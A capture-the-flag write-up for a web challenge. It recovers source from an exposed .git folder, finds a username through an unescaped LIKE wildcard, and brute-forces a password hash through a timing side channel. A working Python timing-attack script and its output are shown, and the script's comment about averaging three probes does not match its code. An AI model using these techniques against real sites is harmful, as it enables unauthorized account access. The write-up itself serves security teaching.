### Lawn Care Simulator (Web, 200pts)

## Problem

Lawn Care Simulator is a simple web application to show how the grass is growing. Yeah, ok. It has premium content, but it requires registration. Registration not working and there's no way to log in as we can't register any account.



## Solution

# Phase 1 - explore .git repository

In source code of index.html there's an AJAX request to Git repository (to find current application version). So we can exploit .git folder on remote server.

Following SHA-1 Git objects hash, we can find and download ource files (not all, unfortunately):

Here's tree hash:
```
$ git cat-file -p aa3025bdb15120ad0a2558246402119ce11f4e2e
tree 731924d14616f3f95c1d75e822a6a97a69f1a32f
author John G <john@lawncaresimulator2015thegame.com> 1442602067 +0000
committer John G <john@lawncaresimulator2015thegame.com> 1442602067 +0000

I think I'll just put mah source code riiiiighhhht here. Perfectly safe place for some source code.
```

And here's tree content:

```
$ git cat-file -p 731924d14616f3f95c1d75e822a6a97a69f1a32f

100644 blob 4bcb0b3cf55c14b033e3d7e0a94b6025f6956ec7	___HINT___
100644 blob 43d1df004d9cf95f2c5d83d2db3dcf887c7a9f2f	index.html
100644 blob 27d808506876eeb41d6a953ac27f33566216d25f	jobs.html
040000 tree 220a9334b01b77d1ac29b7fd3a35c6a18953a96d	js
100644 blob 73009145aac48cf1d0e72adfaa093de11f491715	premium.php
100644 blob 8e4852023815dc70761e38cde28aebed9ec038e3	sign_up.php
100644 blob 637c8e963a5fb7080ff639b5297bb10bca491bda	validate_pass.php
```

File *__HINT__* does not contain anything helpful. But as we can analyze source code of some files and after a few minutes of reading it, we can identify some key points:

* registration is NOT working, BUT we can try guess/find already existing username(s):

```php
    $user = mysql_real_escape_string($_POST['username']);
    // check to see if the username is available
    $query = "SELECT username FROM users WHERE username LIKE '$user';";
    $result = mysql_query($query) or die('Query failed: ' . mysql_error());
    $line = mysql_fetch_row($result, MYSQL_ASSOC);
    if ($line == NULL){
        // Signing up for premium is still in development
        echo '<h2 style="margin: 60px;">Lawn Care Simulator 2015 is currently in a private beta. Please check back later</h2>';
    }
    else {
        echo '<h2 style="margin: 60px;">Username: ' . $line['username'] . " is not available</h2>";
    }
```

* logging is working, but we have to find valid username and try to pass login validation. After succesful login we will be able to get the flag:

```php
    require_once 'validate_pass.php';
    require_once 'flag.php';
    if (isset($_POST['password']) && isset($_POST['username'])) {
        $auth = validate($_POST['username'], $_POST['password']); 
        if ($auth){
            echo "<h1>" . $flag . "</h1>";
        }
        else {
            echo "<h1>Not Authorized</h1>";
        }
    }
    else {
        echo "<h1>You must supply a username and password</h1>";
    }
```


# Phase 2 - find username

Let's get through those lines (sign_up.php):

```php
    $user = mysql_real_escape_string($_POST['username']);
    // check to see if the username is available
    $query = "SELECT username FROM users WHERE username LIKE '$user';";
  
```

First of all - mysql_real_escape_string() does not allow SQL Injection here. But as we can see, we can try to use special chars for LIKE (% or _), which are NOT ESCAPED by mysql_real_escape_string().

So when we try to register with username eg. '%%', we see this screen:

We have existing username (~~FLAG~~), now we have to try to find the password.


# Phase 3 - bruteforce password validation

Validation of password looks a little bit tricky at the first look:

```php

    if (strlen($pass) != strlen($hash))
        return False;
		
    $index = 0;
    while($hash[$index]){
        if ($pass[$index] != $hash[$index])
            return false;
        # Protect against brute force attacks
        usleep(300000);
        $index+=1;
    }
    return true;
```

*$hash* is value from DB and *$pass* is MD5 hash of password from login form. First check is the length - if the length of $pass not equals the length of $hash, validation returns false. So even if we spoofing login form (eg. via Burp Suite or ZAP) we still have to send 32 signs (MD5 hash).

Then script checks sign by sign if $hash and $pass are equal and it returns false right after first difference. If signs are the same, it waits 0.3 sec before next check. And this is exactly what we need to bruteforce this validation.

Assuming that any valid sign took about 0.3 sec break before next sign, we can compare requests time for every single character allowed in MD5 string starting from first character (any hex digit in this case). I've created simple Python script for this. It just creates 32 characters string starting from 0 through f and sending it to the server. Then we can check if there's character which causes a little bit longer response:

```python
#!/usr/bin/python

import requests
import sys

headers = {
    "Referer": "http://54.175.3.248:8089/",
    "Content-type": "application/x-www-form-urlencoded",
    "Host": "54.175.3.248:8089"
}


def send_request(current_password):
    payload = {"username": "~~FLAG~~", "password": current_password}

    r = requests.post("http://54.175.3.248:8089/premium.php", headers=headers,
                      data=payload)
    return r.elapsed.total_seconds()


charset = "abcdef0123456789"
final_password = sys.argv[1]

current_password = ""
s = ""
for c in charset:
    current_password = final_password + c + "-" * (31 - len(final_password))

    # send payload and check response time, avg from 3 probes
    print "sending payload with password: {}".format(current_password)

    t = send_request(current_password)
    print "time for {} - {}".format(c, t)

final_password += s
print "\n\ncurrent final password: {} ({} chars)\n\n".format(final_password,
                                                             len(
                                                                 final_password))

```

I took some time, but finally I was able to find 10 first characters in MD5 hash of ~~FLAG~~'s user password - and when I've sent it I've got the flag (sample try after three signs (667) - script shows 4th sign, which is 'e' - timing is ~0.3s more than average, then one of the final try with 667e217666 as the beginning, when times were not changing anymore):

```

$ ./pass_time_check.py 667

sending payload with password: 667a----------------------------
time for a - 1.206054
sending payload with password: 667b----------------------------
time for b - 1.1628
sending payload with password: 667c----------------------------
time for c - 1.123849
sending payload with password: 667d----------------------------
time for d - 1.123673
sending payload with password: 667e----------------------------
time for e - 1.533342
sending payload with password: 667f----------------------------
time for f - 1.123596
sending payload with password: 6670----------------------------
time for 0 - 1.12424
sending payload with password: 6671----------------------------
time for 1 - 1.139995
sending payload with password: 6672----------------------------
time for 2 - 1.209023
sending payload with password: 6673----------------------------
time for 3 - 1.122856
sending payload with password: 6674----------------------------
time for 4 - 1.123731
sending payload with password: 6675----------------------------
time for 5 - 1.124603
sending payload with password: 6676----------------------------
time for 6 - 1.122691
sending payload with password: 6677----------------------------
time for 7 - 1.12402
sending payload with password: 6678----------------------------
time for 8 - 1.123192
sending payload with password: 6679----------------------------
time for 9 - 1.1241



$ ./pass_time_check.py 667e217666

sending payload with password: 667e217666a---------------------
time for a - 3.317382
sending payload with password: 667e217666b---------------------
time for b - 3.274132
sending payload with password: 667e217666c---------------------
time for c - 3.376334
sending payload with password: 667e217666d---------------------
time for d - 3.273846
sending payload with password: 667e217666e---------------------
time for e - 3.274608
sending payload with password: 667e217666f---------------------
time for f - 3.27328
sending payload with password: 667e2176660---------------------
time for 0 - 3.213485
sending payload with password: 667e2176661---------------------
time for 1 - 3.234123
sending payload with password: 667e2176662---------------------
time for 2 - 3.272356
sending payload with password: 667e2176663---------------------
time for 3 - 3.274707
sending payload with password: 667e2176664---------------------
time for 4 - 3.27386
sending payload with password: 667e2176665---------------------
time for 5 - 3.272986
sending payload with password: 667e2176666---------------------
time for 6 - 3.27506
sending payload with password: 667e2176667---------------------
time for 7 - 3.274545
sending payload with password: 667e2176668---------------------
time for 8 - 3.273122
sending payload with password: 667e2176669---------------------
time for 9 - 3.290462

```

After *667e217666* time of responses stopped to change, so I've decided to try only with this (I've added some random chars to get 32 characters length of the whole hash) - and it was enough:

lawncare03.png


And the flag was: *gr0wth__h4ck!nG!1!1!*

(I don't know why it has worked just after 10 characters, but I suppose that there was some kind of pre-validation, which was not visible in the code and CTF organizers were able to determine valid solution a little bit earlier than after all guessed hash.)


